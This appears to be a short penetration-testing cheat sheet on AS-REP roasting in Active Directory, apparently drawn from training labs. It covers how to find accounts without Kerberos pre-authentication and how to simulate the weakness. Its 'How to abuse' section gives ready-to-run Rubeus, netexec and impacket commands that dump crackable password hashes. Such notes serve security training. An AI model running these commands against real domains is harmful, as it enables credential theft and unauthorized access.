## What is?
It is a attack vector that targets users in AD that holds the specific settings "Do not require pre-auth." The only information the attacker needs is the username they want to attack, which can also be found using other enumeration techniques. Once the attacker has the username, they send a special AS_REQ (Authentication Service Request) packet to the KDC (Key Distribution Center), pretending to be the user. The KDC sends back an AS_REP, which contains a portion of information encrypted with a key derived from the user's password. The key can be cracked offline to obtain the user's password.

## How do identify?
You can see it in Bloodhound easily. 
Alternatively via netexec with the `-asreproast` option.
You can do it also in Windows via **Powerview.ps1**.
```powershell-session
Import-Module .\PowerView.ps1
Get-DomainUser -UACFilter DONT_REQ_PREAUTH
```

## How to abuse?
In windows you can do it via **Rubeus.exe**.
```powershell-session
.\Rubeus.exe asreproast /user:jenna.smith /domain:inlanefreight.local /dc:dc01.inlanefreight.local /nowrap /outfile:hashes.txt
```
In Linux you can use **netexec**.
```
netexec ldap 192.168.0.104 -u harry -p pass --asreproast output.txt
```
But you can also do it with **impacketer**.
```
impacket-GetNPUsers jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

## How to simulate?
If you would ever need to simulate this you can either set the flag in the "User & Computers --> Choose an account --> Account --> Set `Do not require pre-authentication`". 
Otherwise you can do it with in Powerview.ps1.
```powershell-session
Import-Module .\PowerView.ps1
Set-DomainObject -Identity userName -XOR @{useraccountcontrol=4194304} -Verbose
```